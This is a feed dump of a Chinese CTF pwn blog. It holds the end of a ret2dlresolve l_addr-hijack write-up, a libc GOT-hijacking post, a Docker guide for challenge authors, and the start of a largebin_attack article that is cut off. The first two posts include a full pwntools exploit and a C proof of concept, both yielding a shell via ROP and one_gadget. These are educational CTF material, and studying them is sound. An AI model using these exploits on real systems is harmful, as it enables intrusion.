DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;<span class="comment">/* Pointer to program header table in core.  */</span> <span class="comment">//elf的头表</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span> <span class="comment">//elf的入口</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span> <span class="comment">//头表的节数</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span> <span class="comment">//dyn中的描述符数量</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>我们的主角<code>l_addr</code>，注意到他记录了每个模块的基地址。一般来说，ld是第一个被加载的模块，libc是第二个。因此我们可以通过固定偏移直接得到libc的基地址。</p><p>获得基址之后要干什么呢？如果我们想要利用栈溢出进行rop，那么必须绕过stack_chk_fail函数。libc被载入后，基地址被记录下来，接下来调用libc中的函数，会通过这个基址加上函数在libc中的偏移计算函数的真实地址。所以如果我们劫持libc对应的l_addr减去或加上一定偏移，就能使stack_chk_fail函数被解析成其他函数。</p><p>当然这个l_addr也不能乱修改。举个例子，如果解析到了另一个函数A，但是函数A内原本还会调用函数B，这个函数B也会被解析成一个错误的函数，可能就会因为寄存器等一系列问题而导致程序卡住。所以绕过stack_chk_fail函数，一般要找不怎么受寄存器影响也不怎么会影响寄存器的函数。<code>uselib</code>就是这么完美的一个函数（unshare也行）。</p><p>这样操作下来，就算程序检测到了栈溢出，也只会执行一个没什么影响的函数，我们可以继续安心的执行ROP。</p><p>看到这里有同学可能会问了，为什么不直接让它解析为onegadget呢？很简单，因为寄存器条件并不能满足</p><h3 id="0x03-分析调试"><a href="#0x03-分析调试" class="headerlink" title="0x03 分析调试"></a>0x03 分析调试</h3><p>接下来我们看看怎么调试找到我们想要的l_addr的偏移。在pwndbg中输入<code>p/x _rtld_global._dl_rtld_map</code>就能看到关于ld的模块信息。<img src="https://c-lby.top/images/ret2dl-hijack-l-addr/ld%E7%9A%84%E6%A8%A1%E5%9D%97%E4%BF%A1%E6%81%AF.png" alt="ld的模块信息">我们沿着l_prev继续向下寻找libc。输入<code>p/x *(struct link_map *) _rtld_global._dl_rtld_map.l_prev</code>。<img src="https://c-lby.top/images/ret2dl-hijack-l-addr/libc%E7%9A%84%E6%A8%A1%E5%9D%97%E4%BF%A1%E6%81%AF.png" alt="libc的模块信息">可以看到我们就得到了libc基址。我们顺便再看一眼l_name：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _rtld_global._dl_rtld_map.l_prev.l_name</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = 0x7ffff7fbb140 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span></span><br></pre></td></tr></table></figure><p>这个l_name最好不要改动，所幸他与libc的偏移也是固定的，所以可以原封不动地写回去。</p><p>而下标的计算也很简单了，用调试中的<code>_rtld_global._dl_rtld_map.l_prev</code>减去mmap地址基地址就能得到。</p><p>到这，思路明了了，但是还要注意一个问题，程序中只有当下标达到的地方内容不为\x00才会输出8字节，但是如果直接按照上面下标的计算方法的话，第一个字节就是\x00，那就不会输出地址了，这是因为libc基址最低一个字节就是\x00，所以下标要加一。这样的话，写十六字节的时候就会写到l_ld的低一字节，这个字节是不会改变的，一直都是\xc0，payload里补上就行。</p><h3 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./memo2&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./memo2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># enc要通过gdb获取，ida上的是错的（tele 0x5555555580c0）</span></span><br><span class="line">pwd = <span class="string">b&#x27;CTF_is_interesting_isn0t_it?&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;password:&#x27;</span>)</span><br><span class="line">r.sendline(pwd)</span><br><span class="line"></span><br><span class="line">printf = <span class="number">0x606F0</span></span><br><span class="line">stack_chk_fail = <span class="number">0x136550</span></span><br><span class="line">offset_mmap_libclinkmap = <span class="number">0x7fd4a6884160</span>-<span class="number">0x7fd4a6882000</span></span><br><span class="line">offset_true_fake_l_addr = libc.sym[<span class="string">&#x27;uselib&#x27;</span>]-stack_chk_fail</span><br><span class="line">offset_name_base = <span class="number">0x7ffff7fbb140</span>-<span class="number">0x7ffff7d88000</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;content): &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(offset_mmap_libclinkmap+<span class="number">1</span>).encode())  <span class="comment"># 第一个字节是\x00，不会有回显的</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">libc_base = u64((r.recv(<span class="number">5</span>).rjust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x1B0A)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">payload = p64(libc_base+offset_true_fake_l_addr)[<span class="number">1</span>:] + \</span><br><span class="line">    p64(libc_base+offset_name_base)+<span class="string">b&#x27;\xC0&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h3><p>这题还有其他解法，比如Qanux师傅选择劫持l_info[5]，伪造symtab，来达到将函数解析成另一个函数的效果，这种做法网上解释比较多，不多赘述。非常感谢xswlhh师傅和Qanux师傅给我机会进V&amp;N战队认识到更多强大的师傅，和这些大爹们一起打比赛。同时非常感谢xf1les爷总是耐心解答我的问题。Orz</p><p>考完期末之后应该会找时间把GeekCTF2024的题目全部复现一遍，题目质量还是非常高的，能学到不少东西。</p>]]></content>
    
    
    <summary type="html">ret2dlresolve之劫持l_addr</summary>
    
    
    
    <category term="ret2dlresolve" scheme="https://c-lby.top/categories/ret2dlresolve/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="ret2dlresolve" scheme="https://c-lby.top/tags/ret2dlresolve/"/>
    
  </entry>
  
  <entry>
    <title>『hijack_libc_got』劫持libc的got表getshell</title>
    <link href="https://c-lby.top/2024/06/25/hijack-libc-got/"/>
    <id>https://c-lby.top/2024/06/25/hijack-libc-got/</id>
    <published>2024-06-25T05:22:56.000Z</published>
    <updated>2024-06-25T08:48:04.752Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在glibc2.34或更高版本，没有了hook用来劫持，所以一般会用IO之类的路子来劫持。如果条件允许，还可以考虑劫持劫持libc的got表来getshell。libc一般是partial relro，所以got表可写。但准确来说，接下来的PoC，其实针对的是劫持.got.plt段执行one gadget而设计的。劫持libcgot的技术还可以结合context的gadget实现rop，后面再深入研究。</p><h3 id="0x01-PoC"><a href="#0x01-PoC" class="headerlink" title="0x01 PoC"></a>0x01 PoC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdint.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 模拟泄露libc</span></span><br><span class="line">    <span class="type">uint64_t</span> libc_base = &amp;<span class="built_in">printf</span> - <span class="number">0x606F0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base = %p\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> gadget = libc_base + <span class="number">0xb1788</span>;</span><br><span class="line">    <span class="type">uint64_t</span> ogg = libc_base + <span class="number">0xebc88</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改j_strlen</span></span><br><span class="line">    <span class="type">uint64_t</span> j_strlen = libc_base + <span class="number">0x21A098</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *)j_strlen) = gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改j_memset</span></span><br><span class="line">    <span class="type">uint64_t</span> j_memset = libc_base + <span class="number">0x21A188</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *)j_memset) = ogg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getshell</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshell&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/hijack_libc_got/PoC%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" alt="PoC运行结果"></p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><h5 id="puts函数的跟进"><a href="#puts函数的跟进" class="headerlink" title="puts函数的跟进"></a>puts函数的跟进</h5><p>PoC最后执行了一个puts函数，并且直接_exit，没法劫持exit_hook。我们去IDA翻一翻puts函数都干了些什么。<img src="https://c-lby.top/images/hijack_libc_got/puts_ida.png" alt="puts_ida"></p><p>发现它调用了j_strlen函数，我们跟进看看。<img src="https://c-lby.top/images/hijack_libc_got/j_strlen%E5%9C%A8pltsec%E6%AE%B5.png" alt="j_strlen在pltsec段"></p><p>继续跟进<img src="https://c-lby.top/images/hijack_libc_got/j_strlen%E5%9C%A8gotplt%E6%AE%B5.png" alt="j_strlen在gotplt段"></p><p>发现最后来到了.got.plt段。这是一个可读可写的段，所以我们可以通过劫持这个strlen的内容为one gadget，让程序执行到puts的时候，调用的是ogg，从而getshell。</p><h5 id="got-plt段函数的规律"><a href="#got-plt段函数的规律" class="headerlink" title=".got.plt段函数的规律"></a>.got.plt段函数的规律</h5><p>这里我们可以发现一个规律：<img src="https://c-lby.top/images/hijack_libc_got/gotplt%E6%AE%B5.png" alt="gotplt段"></p><p>不难发现这些函数大部分都指向.plt.sec段，并且命名都有<code>j_</code>开头。那么在实际做题的时候思路就很清晰了，我们可以去找我们要劫持的函数会不会调用到这样命名的函数，有的话就有机会通过劫持got表getshell。</p><h5 id="劫持strlen后无法getshell"><a href="#劫持strlen后无法getshell" class="headerlink" title="劫持strlen后无法getshell"></a>劫持strlen后无法getshell</h5><p>PoC中我并没有直接将strlen劫持为ogg，因为直接劫持是没办法getshell的。下面用一道其他题目的调试过程来展示这一点。</p><p>我们先来看ogg：<img src="https://c-lby.top/images/hijack_libc_got/ogg.png" alt="ogg"></p><p>PoC中我们选择的是0xebc88，也就是说我们要让rsi和rdx都为NULL的情况下，这个ogg才能正常getshell。但是我们运行脚本会发现程序炸了，调试观察看住的地方，发现此时rdx并不为零。<img src="https://c-lby.top/images/hijack_libc_got/ogg%E6%9D%A1%E4%BB%B6%E4%B8%8D%E6%BB%A1%E8%B6%B3.png" alt="ogg条件不满足"></p><p>那么我们就要想办法使rdx为0。当然这里调整ogg条件的方法不止一种，毕竟ogg不止这一个，还可以通过调栈的方法满足条件，这个具体视题目条件而定。</p><h5 id="调整寄存器状态满足ogg条件"><a href="#调整寄存器状态满足ogg条件" class="headerlink" title="调整寄存器状态满足ogg条件"></a>调整寄存器状态满足ogg条件</h5><p>回到这里，其实PoC的情况和上述情况差不多，也是rdx不为0导致的程序出错。解决思路是，找到形如<code>mov rdx , rsi; call xxx</code>这样的gadget，将其地址写入到strlen的got中，然后在xxx的got表中写入ogg地址。我们用<code>ropper -f libc.so.6 -search &quot;mov rdx, rsi&quot;</code>找一下gadget。<img src="https://c-lby.top/images/hijack_libc_got/gadget.png" alt="gadget"></p><p>发现有两条符合的gadget，但是上面那个gadget会导致rsi被改变为2，所以不能用。所以我们将0xb1788的gadget写到strlen的got中。在IDA中查看一下0x28670处，发现是memset的.plt.sec，因此我们只要将memset的got表改为ogg即可。顺带一提，下面那个gadget是<code>explicit_bzero</code>函数中的。</p><p><img src="https://c-lby.top/images/hijack_libc_got/gadget%E5%87%BA%E5%A4%84.png" alt="gadget出处"></p><p>于是就有了PoC那样的劫持步骤。</p><p>总结一下：</p><ol><li>泄露libc地址</li><li>劫持<code>strlen</code>的got表，写入<code>explicit_bzero</code>的gadget</li><li>劫持<code>memset</code>的got表，写入one gadget</li><li>执行puts函数getshell</li></ol><p>实际题目中，我们要劫持的函数不一定是puts函数，可以是<code>stack_chk_fail</code>或者其他的，只要调用了got表函数，能满足ogg条件，都能劫持。甚至为了满足ogg条件，可以凑一条调用链出来。</p>]]></content>
    
    
    <summary type="html">一种劫持libc的got表getshell的方法</summary>
    
    
    
    <category term="hijack_libc_got" scheme="https://c-lby.top/categories/hijack-libc-got/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="libc_got" scheme="https://c-lby.top/tags/libc-got/"/>
    
  </entry>
  
  <entry>
    <title>出PWN题可能会遇到的docker相关问题及其解决办法</title>
    <link href="https://c-lby.top/2024/06/11/first-docker/"/>
    <id>https://c-lby.top/2024/06/11/first-docker/</id>
    <published>2024-06-11T00:22:44.000Z</published>
    <updated>2024-08-21T17:23:43.024Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近给战队出了一道pwn题，第一次体验完整的出题流程，涉及到docker的使用。因为是第一次使用docker来封装题目环境，所以遇到了很多问题。网上有一些关于出pwn题的使用方法，但是有些问题没有提到，所以这里记录一下我遇到的问题，还有解决方法。docker的安装网上教程很多这里不多赘述。</p><p>顺带一提，我的操作环境是wsl2的Ubuntu 22.04.3 LTS，若有因环境不同而引起的操作不同，具体请查询其他资料。</p><h3 id="0x01-一些前置知识or命令"><a href="#0x01-一些前置知识or命令" class="headerlink" title="0x01 一些前置知识or命令"></a>0x01 一些前置知识or命令</h3><p>一般来说，docker的命令之前要加一个sudo来提升权限，不然有些命令可能执行不了。</p><p><code>sudo docker images</code>：查看系统中存有的所有镜像及相关信息。</p><p><img src="https://c-lby.top/images/first_docker/docker_images.png" alt="docker_images"></p><p><code>sudo docker ps -a</code>：查看系统中所有容器的状态。</p><p><img src="https://c-lby.top/images/first_docker/docker_ps.png" alt="docker_ps"></p><p><code>sudo docker ps</code>：查看当前运行中的容器。</p><p>镜像和容器的关系就好比C++中的类和其实例对象的关系，一个镜像可以同时有多个容器运行。</p><p><code>sudo docker run -d -p &quot;0.0.0.0:10001:9999&quot; -h &quot;pwn_h&quot; --name=&quot;pwn1&quot; pwn</code>：从名为pwn的镜像中运行一个名为pwn1的容器，并将这个容器映射到10001端口运行。那么我们就可以通过0.0.0.0:10001访问到这个容器里的服务或者运行的程序。9999是docker的内部端口，-h后面接着的是hostname。</p><p><code>sudo docker stop xxx</code>：xxx是某个容器container ID的前三位，或者这个容器的名称也行，这个命令用于停止某个容器的运行。只是停止不是删除。</p><p><code>sudo docker rm xxx</code>：xxx是某个容器container ID的前三位，或者这个容器的名称也行，这个命令用于删除一个容器。</p><p><code>sudo docker rmi xxx</code>：xxx是某个镜像image ID的前三位，或者这个镜像的名称也行，这个命令用于删除一个镜像。注意镜像ID和容器ID是不一样的。</p><p><code>sudo docker build . -t pwn</code>：在当前目录下通过dockerfile来build一个名为pwn的镜像。别漏了中间那个点。</p><p><code>sudo docker cp pwn:/home/ctf/flag ./flaglocal</code>：从名为pwn的容器中复制&#x2F;home&#x2F;ctf&#x2F;flag到自己电脑当前目录，并命名为flaglocal。把两个路径反过来就是从电脑复制文件到容器中。</p><p><code>sudo docker exec -it xxx /bin/bash</code>：xxx是某个容器container ID的前三位，或者这个容器的完整ID也行，这个命令表示以root身份进入到容器中操作。在容器内输入exit或者按ctrl+D即可退出容器回到自己的系统。</p><p><code>sudo docker info</code>：查看docker概况，包括镜像源。</p><p><code>sudo docker save aaa &gt; aaa.tar</code>：保存名为aaa的镜像并导出保存为tar。</p><p><code>sudo docker load --input aaa.tar</code>：从aaa.tar导入镜像</p><h3 id="0x02-dockerfile"><a href="#0x02-dockerfile" class="headerlink" title="0x02 dockerfile"></a>0x02 dockerfile</h3><p>一般CTF赛制中pwn出题对dockerfile都是有特定要求的，awd赛制又有另一套方案。可以用<a href="https://github.com/Eadom/ctf_xinetd">ctf-xinetd</a>的模板，关于它的使用可以看这个师傅的<a href="https://cloud.tencent.com/developer/article/2183060">文章</a>。我是用战队师傅给的dockerfile模板来创建镜像的。</p><p>一把来说，CTF的pwn题环境中，为了防止选手搅屎，会限制bin中只有<code>ls</code>、<code>cat</code>、<code>sh</code>三个命令可用，并且限制workdir，这样选手一般就没法搞搞阵了。（如果这还能容器逃逸啥的，可以考虑把sh换成只能显示flag功能）</p><h3 id="0x03-国内部分镜像站被关停无法使用"><a href="#0x03-国内部分镜像站被关停无法使用" class="headerlink" title="0x03 国内部分镜像站被关停无法使用"></a>0x03 国内部分镜像站被关停无法使用</h3><p><code>docker.m.daocloud.io</code>国内依然能用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo vim /etc/docker/daemon.json</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;:[&quot;https://docker.m.daocloud.io&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl daemon-reload</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl restart docker.service</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker info</span></span><br></pre></td></tr></table></figure><p>然后就能看到镜像源已经换了。</p><h3 id="0x04-本地运行与docker中运行结果不一致"><a href="#0x04-本地运行与docker中运行结果不一致" class="headerlink" title="0x04 本地运行与docker中运行结果不一致"></a>0x04 本地运行与docker中运行结果不一致</h3><p>可能是因为docker拉取到的镜像与本地的环境不一样，尤其是libc版本。下面是两个可能的解决方案：</p><ol><li><p>如果题目和内核无关，只和libc版本有关，可以把需要版本的libc和ld放到workdir中，并用patchelf修改程序的libc目录。</p></li><li><p>根据本地环境中的libc版本，还有linux发行版本，可以上网搜到这个版本的发行，然后我们来到docker网站找到与这个日期相近的tag来作为映像。</p><p>举个栗子。现在我的本地环境是ubuntu22.04.3LTS。</p><p>如果我在dockerfile中写<code>FROM ubuntu:22.04</code>，那么他会默认拉取ubuntu22.04的latest版本。我们打开<a href="https://hub.docker.com/_/ubuntu/tags?page=1&page_size=&name=jammy&ordering=">dockerhub</a>看一眼（需要科学上网）。<img src="https://c-lby.top/images/first_docker/dockerhub%E6%9C%80%E6%96%B0.png" alt="dockerhub最新"></p><p>换句话说，这个时候<code>FROM ubuntu:22.04</code>和<code>FROM ubuntu:jammy-20240530</code>是一样的。但是最新的是ubuntu22.04.4，显然不符合本地环境。</p><p>可以查到ubuntu22.04.3LTS的发行日期是2023.8.10，那我们就去找tag接近这个日期的映像。<img src="https://c-lby.top/images/first_docker/dockerhub2023tag.png" alt="dockerhub2023tag"></p><p>可以逐个去试一试看符不符合运行期望。也可以在dockerfile中，往镜像假如ldd的指令，这样就可以进入到容器中查看libc版本。</p><p>这里还会出现一个问题，那就是本地的ubuntu是会不断更新的。比如22.04.3一开始的libc版本是2.35_3.1，但是随着安全升级，会变成2.35_3.8，那就可能不能根据日期来选择tag了，因为旧日期的tag版本，libc版本也是旧的。还有一个问题比较恶心的就是，wsl因为魔改的原因，就算linux版本和libc版本一致了，也会因为内核的原因导致奇奇怪怪的问题。所以尽量避免用wsl出题（避坑）。</p><p>出好了题目保存docker之后，最好放到其他机器再测试一下，有时候很鬼畜的不同机器会有不同运行结果的（虽然几率比较小）。</p></li></ol><h3 id="0x05-如何调试docker内运行的程序"><a href="#0x05-如何调试docker内运行的程序" class="headerlink" title="0x05 如何调试docker内运行的程序"></a>0x05 如何调试docker内运行的程序</h3><p>xf1les师傅告诉我，本地运行docker的话，gdb是可以attach到docker中运行的程序的。有两种调试方法。</p><p>第一种是进入到容器当中运行程序，然后在另一个终端再进一次容器，通过<code>pmap -d pid</code>来查看程序内存布局。这里的pid是容器内的pid。可以给镜像装gdb，然后就可以在容器里调试了。这个方法有个缺点，那就是在root后的容器里运行程序，他的运行环境不一定是docker环境，可能取决于宿主机。</p><p>第二种是在docker外调试。假如我现在通过nc打开了容器里的某个服务，现在我打开另一个终端，在终端里输入<code>ps -auxw</code>，可以看到刚刚开启的服务的名字，用对应的pid（这个pid是对应本机linux的）来进行attach：<code>gdb attach pid</code>即可调试容器中的程序。这样调试的话，可以用自己电脑上的pwndbg，比较方便，而且更加准确。但是这样attach是无法自动载入符号表的，需要在pwndbg中手动设置程序和libc和ld。</p><p>如果想从脚本调试，可以在脚本中穿插一个pause，然后手动查找pid并attach。</p><h3 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h3><p>pwn出题还是相当不容易的。如果后续还遇到了其他问题，我会继续更新。一定不要用wsl出题！！！</p>]]></content>
    
    
    <summary type="html">记录第一次出PWN题可能会遇到的docker相关问题及其解决办法，还有其他可能用得上的一些命令</summary>
    
    
    
    <category term="docker" scheme="https://c-lby.top/categories/docker/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="docker" scheme="https://c-lby.top/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>『Heap Exploitation』largebin_attack</title>
    <link href="https://c-lby.top/2024/06/04/largebin-attack/"/>
    <id>https://c-lby.top/2024/06/04/largebin-attack/</id>
    <published>2024-06-04T02:11:17.000Z</published>
    <updated>2024-06-04T15:14:15.196Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>首先每个Large Bin中存在63个bin链表，在binmap中的index是64-126。每个bin中存的是一定范围内大小的chunk，而不是像tcachebin那样的一个bin一个大小。举个栗子，index64的bin中存的是0x400到0x430的chunk。每个bin能存取的范围一般是0x30。</p><p>Large Bin既不是FIFO也不是LIFO，它的排序是根据chunk大小来进行的，并且结构更加复杂。large chunk被释放的时候不仅会被写入fd和bk，还有fd_nextsize和bk_nextsize两个指针来维护bin的结构。fd和bk用来链接bin中相同大小的chunk，而nextsize则用来链接bin中不同大小的chunk。更具体地说，<code>fd</code>指向比自己晚释放的相同大小的chunk，<code>bk</code>则指向比自己晚释放的相同大小的chunk，<code>fd_nextsize</code>用来指向比自己大的chunk，<code>bk_nextsize</code>则指向比自己小的chunk。在相同大小的chunkbin中只有首堆块会有nextsize的指针。bin中首尾chunk的nextsize会指向另一端，首堆块的fd会指向对应index的bin头地址，尾堆块的bk会指向对应index的bin头地址。</p><p>这里引用Sr0cky师傅的一张图，可以更直观地看清楚largebin的结构：</p><p><img src="https://c-lby.top/images/largebin_attack/largebin%E9%93%BE%E8%A1%A8%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="largebin链表示意图"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>我们只关注释放chunk时候的代码，因为主要检查在这个地方，主要利用的地方也在这里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">       ...</span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">          &#123;</span><br><span class="line">            victim_index = smallbin_index (size);</span><br><span class="line">            bck = bin_at (av, victim_index);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            victim_index = largebin_index (size);</span><br><span class="line">            bck = bin_at (av, victim_index);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* maintain large bins in sorted order */</span></span><br><span 